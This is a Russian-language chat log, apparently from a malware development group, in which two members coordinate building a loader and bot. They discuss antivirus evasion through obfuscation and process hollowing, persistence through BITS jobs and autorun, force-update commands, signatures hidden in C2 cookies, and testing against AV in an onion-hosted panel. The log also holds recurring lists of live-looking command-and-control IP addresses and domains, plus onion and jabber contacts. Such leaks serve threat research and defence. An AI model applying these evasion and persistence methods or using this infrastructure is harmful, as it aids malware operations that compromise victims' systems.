2020-09-24T13:36:32 mushroom -> frog
Ну и каждый день ему сдавай комплект стабильный который. А там доработки всякие в другой ветке делай, потом сливай в стабильную.

2020-09-24T13:45:24 mushroom -> frog
Я тут откопал библиотеку, которая позволяет не использовать msvcruntime http://www.malsmith.net/minicrt/

2020-09-24T13:45:48 mushroom -> frog
У меня размер загрузчика в 7 раз уменьшился.

2020-09-24T13:46:59 mushroom -> frog
Ещё откопал программу, которая по быстрому обфусцирует сроку если надо https://www.codeproject.com/Articles/1210398/TinyObfuscate-A-small-String-Obfuscator

2020-09-24T13:48:33 frog -> mushroom
Спасибо. Посмотрю

2020-09-24T14:02:44 frog -> mushroom
По поводу обновления хотел спросить. Если нужно обновить загрузчик, старый загрузчик нужно удалить, а новый сохранить под именем старого?

2020-09-24T14:03:29 mushroom -> frog
Старый удалить, скачать и запустить новый.

2020-09-24T14:04:30 mushroom -> frog
Тоже самое как команда 10 с сохранением на диск, только ещё в начале старый загрузчик надо удалить.

2020-09-24T14:04:58 mushroom -> frog
То есть когда загрузчик запускает бот, он должен передать ему своё имя файла.

2020-09-24T14:05:15 mushroom -> frog
Тогда легко удалишь его из бота по команде.

2020-09-24T14:07:49 frog -> mushroom
Изначально загрузчики сохраняются в папку Temp? Или другую?

2020-09-24T14:08:29 mushroom -> frog
Изначально это что имеется ввиду?

2020-09-24T14:08:52 mushroom -> frog
Когда скачиваешь?

2020-09-24T14:09:05 frog -> mushroom
Перед самым первым запуском

2020-09-24T14:09:27 mushroom -> frog
Это не известно. Пользователь может куда угодно скачать.

2020-09-24T14:10:11 mushroom -> frog
Можно же получить своё имя GetModuleHandleFileName

2020-09-24T14:10:35 mushroom -> frog
Вот его передавай в бот.

2020-09-24T14:15:40 frog -> mushroom
Т.е. в системе закрепляется тот, который будет скопирован в папку Temp? Или загрузчик закрепляет сам себя при любом запуске?

2020-09-24T14:16:47 mushroom -> frog
Загрузчик больше себя сам не закрепляет. Его закрепляет бот. Получается загрузчик запустился скачал и запустил бот и всё.

2020-09-24T14:16:57 mushroom -> frog
При запуске передал боту своё имя.

2020-09-24T14:17:33 mushroom -> frog
Бот получил команду 18 и с помощью имени файла загрузчик, которое ему известно закрепил его.

2020-09-24T14:18:50 mushroom -> frog
Обновление так работает, бот скачал загрузчик, удалил старый, запустил новый и завершился. Новый загрузчик скачает бот и запустит по новой. И Вновь запущенный бот будет знать имя файла нового загрузчика.

2020-09-24T14:55:24 frog -> mushroom
Т.е. обновление запускается только через админку? Командами "upload loader x64"?

2020-09-24T14:59:13 mushroom -> frog
Когда загрузчик запускается он получает версию из админки, если она отличается, он скачивает, запускает её и завершается. Если бот получает команду Force Update Now, то он скачивает файл, который там, удаляет старый загрузчик, запускает скачанный файл и завершает работу.

2020-09-24T15:01:30 mushroom -> frog
Если у команды Force Update Now не указан файл, то бот просто запускает старый загрузчик и завершает работу.

2020-09-24T15:01:59 mushroom -> frog
Всякие там Upload loader x86 не надо делать пока.

2020-09-24T15:02:11 mushroom -> frog
Только Force Update Now.

2020-09-25T12:29:31 mushroom -> frog
Привет.

2020-09-25T12:29:33 mushroom -> frog
лоадеры
185.90.61.207 
92.242.40.241 
139.60.163.131 
185.242.85.194
195.123.237.153
185.142.99.8

бот
185.164.32.108 
185.244.39.65 
86.104.194.20 
88.150.197.187 
5.9.178.75 
45.138.158.53

2020-09-25T16:38:45 mushroom -> frog
Привет.

2020-09-25T16:38:45 mushroom -> frog
лоадеры
185.90.61.207 
92.242.40.241 
139.60.163.131 
185.242.85.194
195.123.237.153
185.142.99.8

бот
185.164.32.108 
185.244.39.65 
86.104.194.20 
88.150.197.187 
5.9.178.75 
45.138.158.53

2020-09-28T07:12:29 mushroom -> frog
Привет.

2020-09-28T07:12:30 mushroom -> frog
лоадеры
62.108.35.194
134.255.254.50 
23.239.84.136 
46.17.107.111 
185.68.93.33 
212.80.219.191

бот
23.239.84.132 
194.5.249.126 
51.89.177.5
104.161.32.103 
107.155.137.7 
37.220.6.119

2020-09-28T08:19:01 mushroom -> frog
У тебя детектов нету на автотестах?

2020-09-28T08:23:12 frog -> mushroom
Привет. У меня Behavior:Win32/DefenseEvasion появился сегодня. Разбираюсь, в чём причина. С маскировкой что-то не так.

2020-09-28T08:24:20 mushroom -> frog
На x64?

2020-09-28T08:26:24 frog -> mushroom
Да

2020-09-28T08:28:38 mushroom -> frog
Поробуй отключить создание ProcessHollowing в загрузчике и посмотри прошёл ли этот детект.

2020-09-28T08:30:36 mushroom -> frog
[11:29:35] <mushroom> На dyncheck сливаются если проверять на динамику? 
[11:29:41] <buza> да, могут 
[11:29:55] <buza> да динчек можно проверить непосредственно перед выдачей в бой 
[11:30:00] <buza> до этого следует пользоваться автотестами

2020-09-28T08:31:13 mushroom -> frog
Теперь проверяй на автотестах наших, на динамику, а не на dyncheck.

2020-09-28T08:33:12 frog -> mushroom
А как проверять на автотестах?

2020-09-28T08:34:14 frog -> mushroom
Это то, что Bentley делает?

2020-09-28T08:34:15 mushroom -> frog
Сейчас кое что доделаю расскажу. Пока проверь уходит детект или нет.

2020-09-28T08:34:28 mushroom -> frog
Нет.

2020-09-28T09:54:54 mushroom -> frog
У тебя в cryptoPanel есть учётная запись?

2020-09-28T09:56:53 frog -> mushroom
Нет

2020-09-28T10:04:22 mushroom -> frog
Буза сделал тебе учётную запись. Заходи https://ncdzrppa5xl3vw57lk6x3prcj5p63y3m46t4giq6rvdsa3woed3hicid.onion/crpanel

2020-09-28T10:05:09 mushroom -> frog
Там выбирай свою вкладку если есть, если нету выбирай вкладку others, загружай туда загрузчик свой.

2020-09-28T10:05:23 mushroom -> frog
Нажимай кнопку VM.

2020-09-28T10:05:55 mushroom -> frog
Выбирай машины с антивирусами, выбирай внизу AV Only и нажимай OK.

2020-09-28T10:06:26 mushroom -> frog
Вот руководство https://mk6gwg6mwnn6if33.onion/attachments/72

2020-09-28T10:07:49 frog -> mushroom
Какой логин и пароль?

2020-09-28T10:08:03 frog -> mushroom
Нашёл

2020-09-28T10:08:45 mushroom -> frog
Там есть вкладка frog?

2020-09-28T10:11:44 frog -> mushroom
Зашёл. Справа наверху написано "frog"

2020-09-28T10:12:00 mushroom -> frog
Вот туда загружай значит.

2020-09-30T07:28:29 frog -> mushroom
Привет. Сегодня какие ip-адреса?

2020-09-30T07:43:21 mushroom -> frog
Такие же. Проверь только все на работоспособность.

2020-09-30T07:43:47 mushroom -> frog
Проверь что запросы работают на них.

2020-09-30T08:55:15 mushroom -> frog
Сделай загрузчик ещё чтобы был примитивны, только скачивает и запускает без сохранения на диск бот.

2020-09-30T08:59:45 mushroom -> frog
У тебя DefenseIvasion Бентли сказал. Это точно не обфускатор строк и не обфускатор api. Я сделал загрузчик с другими обфускаторами и без них вообще и детект есть. Я думаю это process hollowing.

2020-09-30T10:13:47 mushroom -> frog
У меня тут предположение по поводу DefenseIvasion\Wacatac. Зайди в свойства проекта, общие, имя целевого объекта, и измени текущее имя на что нибудь другое. Я у себя сделал, пока не поймал этих детектов больше.

2020-09-30T10:14:29 mushroom -> frog
Ещё нужно собрать комплект для группы 4 обычный, и для группы 7 с примитивным загрузчиком, как я писал выше.

2020-09-30T10:17:40 frog -> mushroom
Сегодня отправил Бентли несколько комплектов группы 7

2020-09-30T10:20:00 mushroom -> frog
Без детектов?

2020-09-30T10:22:51 frog -> mushroom
У себя проверял. Не было детектов.

2020-09-30T10:23:09 mushroom -> frog
Для группы 4 сделай ещё.

2020-09-30T10:25:23 frog -> mushroom
У меня DefenseIvasion возникал при вызове VirtualAllocEx в модуле маскировки.

2020-09-30T10:27:29 mushroom -> frog
Не обфусцированна была?

2020-09-30T10:29:13 frog -> mushroom
Всё обфусцировано было. Это, кажется, динамический детект. У меня он возникал только при втором запуске, после перезагрузки ОС или при повторном запуске.

2020-09-30T10:33:44 frog -> mushroom
Для группы 4 какие адреса?
Хотелось бы подождать результатов тестирования, потому что функционал существенно изменил, перенёс закрепление в системе.

2020-09-30T10:34:04 frog -> mushroom
Адреса для загрузки бота и загрузчика, имею ввиду

2020-09-30T10:34:05 mushroom -> frog
Такие же адреса.

2020-09-30T10:34:45 frog -> mushroom
Вот эти: /api/v153

2020-09-30T10:34:59 mushroom -> frog
А эти. Сейчас скажу.

2020-09-30T10:46:20 mushroom -> frog
Loader x86 /api/v97, Loader x64 x86 /api/v98, Bot x86 /api/v99, Bot x64 /api/v100

2020-09-30T10:46:52 mushroom -> frog
Loader x86 /api/v97, Loader x64 /api/v98, Bot x86 /api/v99, Bot x64 /api/v100

2020-10-01T09:52:29 frog -> mushroom
Привет. Вчера Бентли потестировал несколько комплектов. 3 из 4 работают нормально, но закрепление в системе в Windows 7 что-то не заработало. Попросил его пустить на виртуальную машину. Хотя у себя тестировал на Windows 7, нормально работает

2020-10-01T10:18:35 mushroom -> frog
Понял. Какое закрепление там?

2020-10-01T10:18:43 mushroom -> frog
Не BITS случайно?

2020-10-01T11:09:08 frog -> mushroom
И BITS, и автозагрузка есть.

2020-10-01T11:09:59 mushroom -> frog
BITS у него на Win 7 всегда так. Если в bitsadmin видно твою задачу и файл существует, то запуститься через какое то время.

2020-10-01T11:10:19 mushroom -> frog
Мой загрузчик у него запускался часа через 2 после перезагрузки.

2020-10-01T11:10:43 mushroom -> frog
BITS сразу не запускается после перезагрузки.

2020-10-01T11:13:39 mushroom -> frog
И не забудь если BITS то программа всегда должна возвращать 1, чтобы BITS её постоянно перезапускала.

2020-10-01T11:16:34 frog -> mushroom
Да, это учёл. Ноль не возвращаю, но 1, - 1 и т.д. (в общем не ноль). Нормально работает. Обязательно единицу?

2020-10-01T11:19:57 mushroom -> frog
Your program should return an exit code of zero. If your program does not return an exit code of zero, BITS checks the state of the job. If the program did not cancel or complete the job, BITS calls the program again after the minimum retry delay specified for the job expires.

2020-10-01T11:20:04 mushroom -> frog
https://docs.microsoft.com/en-us/windows/win32/api/bits1_5/nf-bits1_5-ibackgroundcopyjob2-setnotifycmdline

2020-10-01T11:20:15 mushroom -> frog
Вот описание, главное чтобы не 0 был.

2020-10-01T11:20:32 mushroom -> frog
А то запустит один раз и всё.

2020-10-02T08:15:09 frog -> mushroom
Привет. Поменялись адреса сегодня?

2020-10-02T08:20:38 mushroom -> frog
Нет.

2020-10-06T07:56:40 frog -> mushroom
Привет. Какие IP-адреса сегодня?

2020-10-06T08:11:20 mushroom -> frog
Пока узнаю.

2020-10-06T08:43:57 mushroom -> frog
бот

54.236.253.121 z55gc.com
54.201.135.91  z56gc.com

лоадер


34.230.74.154  z57gc.com
3.135.193.147  z58gc.com
54.190.173.144  z59gc.com

2020-10-06T08:45:24 mushroom -> frog
Собирай группу 4 и 7.

2020-10-06T08:45:53 frog -> mushroom
z55gc.com - это отдельный адрес?

2020-10-06T08:46:01 mushroom -> frog
Одно и тоже.

2020-10-06T08:46:14 mushroom -> frog
Как удобнее используй.

2020-10-06T08:47:14 mushroom -> frog
У тебя какие группы делаешь?

2020-10-06T08:47:28 mushroom -> frog
7 и 41?

2020-10-06T08:47:29 frog -> mushroom
7

2020-10-06T08:47:42 frog -> mushroom
Только 7

2020-10-06T08:47:45 mushroom -> frog
<ajrec> Фрог, группа 41

2020-10-06T08:47:54 mushroom -> frog
Не делал?

2020-10-06T08:48:40 frog -> mushroom
Нет, делал только 7 и seven. Только такие поручали делать

2020-10-06T08:48:55 mushroom -> frog
А 4?

2020-10-06T08:49:08 mushroom -> frog
Помнишь я говорил 4 сделать?

2020-10-06T08:50:35 frog -> mushroom
Да. Собирался делать ещё на прошлой неделе, но тесты не прошли комплекты группы 7, поэтому разбирался в причинах

2020-10-06T08:50:53 mushroom -> frog
Всё разобрались. 41 не твоя.

2020-10-06T08:51:10 mushroom -> frog
Делай 4 и 7. И Бентли сдавай.

2020-10-06T08:51:22 frog -> mushroom
Хорошо

2020-10-07T07:19:52 frog -> mushroom
Привет. Какие IP-адреса сегодня?

2020-10-07T07:44:01 mushroom -> frog
Привет.

2020-10-07T07:44:03 mushroom -> frog
бот

52.12.203.202 x55gc.com
54.162.201.128  x56gc.com

лоадер

13.58.213.252   x57gc.com
3.81.126.82   x58gc.com
54.213.49.29   x59gc.com

2020-10-08T07:54:21 mushroom -> frog
Привет.

2020-10-08T07:54:22 mushroom -> frog
бот

3.235.164.215  ds43x1.com
18.224.51.180  ds44x1.com


лоадер


18.207.182.253  ds45x1.com
35.160.125.254  ds46x1.com
3.238.77.5  ds47x1.com

2020-10-08T07:55:39 frog -> mushroom
Привет

2020-10-08T08:07:54 mushroom -> frog
Тут доработка для лоадера и для бота. Надо сделать так чтобы все полученные куки проверялись как подпись.

2020-10-08T08:08:32 mushroom -> frog
Теперь много куки будет приходить от сервера, подпись будет спрятана среди них.

2020-10-08T08:09:22 mushroom -> frog
Приходит так:
Set-Cookie: ohf29h1f[80h
Set-Cookie: 96302986013-08
Set-Cookie: m\poj\ojmf2j]09§h=8§y-97§fgfb§91fbp8b
Set-Cookie: h'oih'oin'oivno'vhohp98h0j[pkarnv;bka\pgj'p
Set-Cookie: nm;kn'pRH'IHJGR'onvLM'Pvj'oivwehe[8h03ghjf]0h]0fn

2020-10-08T08:10:53 mushroom -> frog
Их все прогоняй как подпись для даты, до того как дата не провериться, не одна не подошла значит подпись не проверена.

2020-10-08T08:11:46 mushroom -> frog
В админке на вкладке Groups теперь есть поле Cookies Names

2020-10-08T08:12:37 mushroom -> frog
Туда пиши имена для куки (только имена). Не меньше 5 штук, разделитель это новая строка.

2020-10-08T08:13:01 frog -> mushroom
Хорошо

2020-10-12T14:45:14 frog -> mushroom
Привет. Какие сегодня IP-адреса?

2020-10-12T15:00:27 mushroom -> frog
бот

54.144.104.189  sawssale.com
3.22.250.104 dustsinc.com

loader

34.220.8.194 justsinc.com
18.212.74.215 onlinewells.com
3.128.197.68  funqwik.com

2020-10-12T15:50:21 mushroom -> frog
Ты кстати сделал чтобы все куки проверялись как подпись? Если сделал пиши во вкладке Groups, в поле Cookies Names имена для куки, в которых будет спрятана подпись. Минимум 5 штук, разделитель новая строка. Во всех группах своих так сделай.

2020-10-14T11:27:26 frog -> mushroom
Привет. Какие сегодня IP-адреса?
На redmine что-то не могу зайти. Там адрес не поменялся?

2020-10-14T11:28:34 mushroom -> frog
Я тоже не могу зайти.

2020-10-14T11:28:45 mushroom -> frog
bot

18.188.194.80 labelcs.com
54.91.36.142  freedubcs.com

loader

54.245.74.151 titlecs.com
54.145.79.240 mixcinc.com
3.138.117.231 nicknamec.com

2020-10-15T08:08:02 frog -> mushroom
Привет. Сегодня IP-адреса изменились?

2020-10-15T08:26:41 mushroom -> frog
Вчерашние адреса не работают. Используй старые:
bot

3.137.180.197  cuprinc.com
3.238.75.236  shophoof.com

loader

34.221.202.231  breezdesign.com
54.83.253.135 hotenlighten.com
18.191.38.26 onebulks.com

2020-10-15T08:26:56 mushroom -> frog
Проверь какие работают из них и спользуй.

2020-10-15T08:27:14 mushroom -> frog
34.221.202.231  breezdesign.com этот не работает вроде.

2020-10-15T15:26:42 frog -> mushroom
Не появились за сегодня новые IP-адреса?

2020-10-15T15:27:29 mushroom -> frog
bot

18.188.194.80 labelcs.com
54.91.36.142  freedubcs.com

loader

54.245.74.151 titlecs.com
54.145.79.240 mixcinc.com
3.138.117.231 nicknamec.com

2020-10-15T15:27:49 mushroom -> frog
Эти я давал, не помню.

2020-10-15T15:28:22 mushroom -> frog
Эти рабочие.

2020-10-15T15:28:38 frog -> mushroom
Хорошо, спасибо

2020-10-16T10:06:44 mushroom -> frog
Привет. Теперь у тебя руководитель kaktus@q3mcco35auwcstmt.onion

2020-10-16T10:07:03 mushroom -> frog
Ему напиши.

2020-11-02T14:15:55 mushroom -> frog
Привет. У тебя есть резервная учётная запись для связи?

2020-11-02T14:16:28 frog -> mushroom
Привет!
crazy_digger@jabber.ru

2020-11-02T14:17:13 mushroom -> frog
Передал.

